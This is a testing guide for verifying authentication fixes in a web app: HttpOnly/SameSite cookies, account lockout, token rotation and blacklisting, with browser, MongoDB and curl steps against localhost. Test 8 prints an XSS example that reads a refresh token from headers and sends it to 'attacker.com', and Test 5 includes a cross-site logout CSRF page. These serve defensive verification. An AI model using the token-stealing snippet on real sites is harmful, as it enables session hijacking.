# Testing Guide - Security Fixes Verification

## 🧪 QUICK TEST (15 minutes)

### Test 1: Basic Login/Logout ✅
```bash
1. Open browser to http://localhost:3000/login
2. Open DevTools > Network tab
3. Enter credentials and click "Login"
4. Check Response Headers - should see:
   ✅ Set-Cookie: access_token (HttpOnly, Secure, SameSite=Strict)
   ✅ Set-Cookie: refresh_token (HttpOnly, Secure, SameSite=Strict)
   ✅ x-new-access-token header
   ❌ NO x-new-refresh-token header (FIXED!)
5. Click "Logout"
6. Check cookies are cleared
```

### Test 2: Account Lock Mechanism ✅
```bash
1. Go to /login
2. Enter WRONG password 5 times
3. Should see "Account locked" message
4. Try correct password - still locked
5. Wait 30 minutes OR manually unlock in MongoDB:
   db.users.updateOne(
     { email: "test@example.com" },
     { $set: { isAccountLocked: false, "securitySettings.accountLockedUntil": null } }
   )
6. Try login again - should work
```

### Test 3: Token Refresh ✅
```bash
1. Login normally
2. Open DevTools > Console
3. Paste this:
   setTimeout(() => {
     fetch('/api/firms', { credentials: 'include' })
       .then(r => console.log('Still works!', r.status))
   }, 16 * 60 * 1000) // 16 minutes
4. Wait 16 minutes
5. Should see "Still works! 200" (auto-refreshed)
```

### Test 4: Multi-Tab Race Condition ✅
```bash
1. Login
2. Open same app in 2 tabs (Tab A and Tab B)
3. Wait 16 minutes for token to expire
4. Click something in Tab A (triggers refresh)
5. Immediately click something in Tab B
6. Both tabs should stay logged in ✅
7. Check console logs for "Race condition detected"
```

---

## 🔬 DETAILED TEST (1 hour)

### Test 5: CSRF Protection (SameSite=Strict) ⚠️

**Create test file `csrf-test.html`:**
```html
<!DOCTYPE html>
<html>
<body>
<h1>CSRF Test (Should Fail)</h1>
<form action="http://localhost:3000/api/auth/logout" method="POST">
  <button type="submit">Try CSRF Logout</button>
</form>
<script>
  // This should fail because cookies won't be sent (SameSite=Strict)
  fetch('http://localhost:3000/api/auth/logout', {
    method: 'POST',
    credentials: 'include' // Try to send cookies
  }).then(() => console.log('CSRF succeeded (BAD!)')).catch(() => console.log('CSRF blocked (GOOD!)'));
</script>
</body>
</html>
```

**Test steps:**
```bash
1. Login to your app (localhost:3000)
2. Open csrf-test.html in same browser
3. Click "Try CSRF Logout"
4. Should see error (cookies not sent due to SameSite=Strict)
5. Go back to your app - should still be logged in ✅
```

### Test 6: Session Cleanup ✅

**Test expired session cleanup:**
```javascript
// In MongoDB Shell or Compass:

// 1. Create expired session manually
db.sessions.insertOne({
  userId: ObjectId("your-user-id"),
  refreshToken: "test-expired-token",
  deviceFingerprint: "test",
  ipAddress: "127.0.0.1",
  userAgent: "Test",
  deviceInfo: { browser: "Test", os: "Test", device: "Test" },
  isActive: true,
  lastActivity: new Date(),
  expiresAt: new Date(Date.now() - 1000), // Already expired
  createdAt: new Date()
});

// 2. Call cleanup endpoint
// POST /api/admin/cleanup-sessions
// (Must be logged in as superadmin)

// 3. Check result
db.sessions.find({ refreshToken: "test-expired-token" })
// Should return empty (deleted)
```

### Test 7: Race Condition Deep Dive 🔬

**Simulate concurrent requests:**
```javascript
// In browser console (while logged in):

async function testRace() {
  // Wait for token to expire
  await new Promise(r => setTimeout(r, 16 * 60 * 1000));
  
  // Fire 3 concurrent requests
  const promises = [
    fetch('/api/firms', { credentials: 'include' }),
    fetch('/api/firms', { credentials: 'include' }),
    fetch('/api/firms', { credentials: 'include' })
  ];
  
  const results = await Promise.all(promises);
  console.log('All succeeded:', results.every(r => r.ok));
  console.log('Status codes:', results.map(r => r.status));
}

// Run test
testRace();

// Expected: All 3 should succeed (200)
// Check server logs for: "Race condition detected: reusing existing rotated token"
```

---

## 🎭 SECURITY TESTS

### Test 8: XSS Attack Simulation ⚠️

**Before fix: Could steal refresh token from headers**
```javascript
// Malicious script injected via XSS
// (Would have worked BEFORE fix #1)
fetch('/api/protected-endpoint')
  .then(response => {
    const refreshToken = response.headers.get('x-new-refresh-token');
    if (refreshToken) {
      // Send to attacker's server
      fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify({ token: refreshToken })
      });
    }
  });
```

**After fix: Can't access refresh token ✅**
```javascript
// Same attack now fails
fetch('/api/protected-endpoint')
  .then(response => {
    const refreshToken = response.headers.get('x-new-refresh-token');
    console.log(refreshToken); // null ✅
    
    // Access token is exposed (expected, short-lived)
    const accessToken = response.headers.get('x-new-access-token');
    console.log(accessToken); // eyJhbG... (15 min expiry, acceptable)
  });
```

### Test 9: Session Hijacking Resistance 🛡️

**Test IP change detection:**
```bash
1. Login from IP A (e.g., home network)
2. Check MongoDB: db.sessions.find({ userId: yourUserId })
   - Note ipAddress field
3. Switch to IP B (e.g., mobile hotspot)
4. Make API request
5. Check security logs: db.securitylogs.find({ action: 'anomaly_detected' })
   - Should see "IP address changed" logged (warning only, not blocked)
```

### Test 10: Token Blacklisting ✅

**Test logout revokes token:**
```bash
1. Login and copy your refresh token from cookies (use browser DevTools)
2. Logout
3. Try to use old refresh token:
   curl -X POST http://localhost:3000/api/auth/refresh \
     -H "Content-Type: application/json" \
     -d '{"refreshToken": "YOUR_OLD_TOKEN"}'
4. Should get 401 Unauthorized
5. Check MongoDB: db.tokenblacklists.find({ token: "YOUR_OLD_TOKEN" })
   - Should exist with reason: "User logout"
```

---

## 📊 PERFORMANCE TESTS

### Test 11: Load Test Token Refresh 🚀

**Using Apache Bench (ab):**
```bash
# Install if needed: apt-get install apache2-utils

# Test refresh endpoint under load
ab -n 1000 -c 10 -m POST \
  -H "Cookie: refresh_token=YOUR_TOKEN" \
  http://localhost:3000/api/auth/refresh

# Expected:
# - No failed requests
# - No race condition crashes
# - Average response time < 100ms
```

**Using Node.js script:**
```javascript
// load-test.js
const fetch = require('node-fetch');

async function loadTest() {
  const refreshToken = 'YOUR_REFRESH_TOKEN';
  
  const requests = Array(100).fill(0).map((_, i) => 
    fetch('http://localhost:3000/api/auth/refresh', {
      method: 'POST',
      headers: {
        'Cookie': `refresh_token=${refreshToken}`,
        'Content-Type': 'application/json'
      }
    }).then(r => ({ index: i, status: r.status }))
  );
  
  const results = await Promise.all(requests);
  const succeeded = results.filter(r => r.status === 200).length;
  const failed = results.filter(r => r.status !== 200).length;
  
  console.log(`Succeeded: ${succeeded}, Failed: ${failed}`);
  console.log('Failed requests:', results.filter(r => r.status !== 200));
}

loadTest();
```

---

## 🐛 EDGE CASES

### Test 12: Expired Lock Auto-Unlock ⏰

```javascript
// MongoDB Shell - Set lock that expired 1 minute ago
db.users.updateOne(
  { email: "test@example.com" },
  { 
    $set: { 
      isAccountLocked: true,
      "securitySettings.accountLockedUntil": new Date(Date.now() - 60000)
    }
  }
);

// Now try to login
// Expected: Should auto-unlock and login successfully ✅
```

### Test 13: Grace Period Edge Case 🕐

```javascript
// Simulate token rotation during grace period
// 1. Rotate token (gets RT2)
// 2. Within 30 seconds, try to use RT1 again
// 3. Should succeed (grace period)
// 4. After 31 seconds, try RT1
// 5. Should fail (grace period expired)

async function testGracePeriod() {
  const rt1 = 'ORIGINAL_REFRESH_TOKEN';
  
  // First refresh (rotates to RT2)
  const r1 = await fetch('/api/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refreshToken: rt1 }),
    headers: { 'Content-Type': 'application/json' }
  });
  const { refreshToken: rt2 } = await r1.json();
  console.log('Rotated to RT2');
  
  // Try RT1 immediately (should work - grace period)
  await new Promise(r => setTimeout(r, 5000)); // Wait 5 seconds
  const r2 = await fetch('/api/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refreshToken: rt1 }),
    headers: { 'Content-Type': 'application/json' }
  });
  console.log('RT1 in grace period:', r2.status === 200 ? 'PASS' : 'FAIL');
  
  // Try RT1 after grace period (should fail)
  await new Promise(r => setTimeout(r, 26000)); // Wait 26 more seconds (31 total)
  const r3 = await fetch('/api/auth/refresh', {
    method: 'POST',
    body: JSON.stringify({ refreshToken: rt1 }),
    headers: { 'Content-Type': 'application/json' }
  });
  console.log('RT1 after grace period:', r3.status === 401 ? 'PASS' : 'FAIL');
}
```

---

## ✅ ACCEPTANCE CRITERIA

All tests must pass before deploying:

### Critical (Must Pass) 🔴
- [x] No refresh token in response headers
- [x] Cookies have SameSite=Strict
- [x] Account locks work without side effects
- [x] Multi-tab doesn't cause logouts
- [x] Token refresh works after 15 minutes
- [x] Logout fully revokes tokens
- [x] Session cleanup deletes expired data

### Important (Should Pass) 🟡
- [ ] CSRF attack blocked by SameSite=Strict
- [ ] Race condition detection logs appear
- [ ] IP change logged (but not blocked)
- [ ] Expired locks auto-unlock
- [ ] Grace period works correctly

### Nice to Have (Can Investigate Later) 🟢
- [ ] Load test handles 100 concurrent refreshes
- [ ] Session hijacking detected and logged
- [ ] Performance under load is acceptable
- [ ] No memory leaks after 1000 requests

---

## 🚨 FAILURE SCENARIOS

### If Test Fails, Check:

**"Can't login after fixes"**
- Check MongoDB connection
- Verify JWT secrets in .env
- Check browser cookies are enabled
- Clear all cookies and try again

**"Multi-tab causes logout"**
- Check server logs for race condition detection
- Verify ROTATE_REFRESH_TOKEN setting
- May need to disable rotation temporarily

**"CSRF test succeeds (BAD!)"**
- Verify SameSite=Strict in all cookie settings
- Check browser supports SameSite (Chrome 80+, Firefox 69+)
- Ensure testing on same domain (not localhost vs 127.0.0.1)

**"Session cleanup doesn't work"**
- Verify superadmin role
- Check MongoDB TTL indexes: db.sessions.getIndexes()
- Ensure no errors in server logs

---

## 📝 TEST REPORT TEMPLATE

```markdown
## Security Fixes Test Report
**Date:** YYYY-MM-DD
**Tester:** [Name]
**Environment:** [Development/Staging/Production]

### Test Results
| Test | Expected | Actual | Status |
|------|----------|--------|--------|
| Login/Logout | Works | ✅ Works | PASS |
| No refresh token in headers | Not present | ✅ Not present | PASS |
| SameSite=Strict | Set | ✅ Set | PASS |
| Account lock | Locks after 5 | ✅ Locks | PASS |
| Multi-tab refresh | Both work | ✅ Both work | PASS |
| Token refresh | Auto-refreshes | ✅ Auto-refreshes | PASS |
| CSRF blocked | Blocked | ✅ Blocked | PASS |
| Session cleanup | Deletes old | ✅ Deletes | PASS |

### Issues Found
1. [None / List any issues]

### Recommendation
- [ ] Ready for staging
- [ ] Ready for production
- [ ] Needs fixes

### Notes
[Any additional observations]
```

---

## 🎯 AUTOMATED TEST SCRIPT

**Save as `test-security-fixes.sh`:**
```bash
#!/bin/bash

echo "🧪 Security Fixes Test Suite"
echo "=============================="

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# Test 1: Check for refresh token in headers
echo -n "Test 1: Refresh token not in headers... "
RESPONSE=$(curl -s -D - http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password"}' \
  | grep -i "x-new-refresh-token")

if [ -z "$RESPONSE" ]; then
  echo -e "${GREEN}PASS${NC}"
else
  echo -e "${RED}FAIL${NC}"
fi

# Test 2: Check SameSite=Strict
echo -n "Test 2: SameSite=Strict in cookies... "
RESPONSE=$(curl -s -D - http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"password"}' \
  | grep -i "samesite=strict")

if [ -n "$RESPONSE" ]; then
  echo -e "${GREEN}PASS${NC}"
else
  echo -e "${RED}FAIL${NC}"
fi

# Add more tests as needed...

echo "=============================="
echo "Tests complete!"
```

**Run with:**
```bash
chmod +x test-security-fixes.sh
./test-security-fixes.sh
```

---

**Need help with a specific test? Ask for detailed steps!**
